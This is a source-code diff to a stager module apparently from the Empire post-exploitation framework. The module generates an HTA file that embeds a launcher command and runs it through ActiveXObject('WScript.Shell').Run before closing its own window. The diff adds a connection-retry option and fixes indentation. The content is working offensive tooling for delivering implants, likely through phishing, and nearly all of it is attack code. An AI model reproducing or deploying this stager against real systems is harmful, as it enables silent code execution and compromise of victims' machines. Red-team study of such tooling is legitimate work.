@@ -25,6 +25,11 @@ class Stager:
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'StagerRetries' : {
+                'Description'   :   'Times for the stager to retry connecting.',
+                'Required'      :   False,
+                'Value'         :   '0'
+            },
             'OutFile' : {
                 'Description'   :   'File to output HTA to, otherwise displayed on the screen.',
                 'Required'      :   True,
@@ -71,19 +76,21 @@ class Stager:
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
+        stagerRetries = self.options['StagerRetries']['Value']
 
         encode = False
         if base64.lower() == "true":
             encode = True
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
             return ""
-	else:
-			code = "<html><head><script>var c= '"
-			code += launcher + "'\n"
-			code += "new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>"
+        else:
+            code = "<html><head><script>var c= '"
+            code += launcher + "'\n"
+            code += "new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>"
+            
         return code
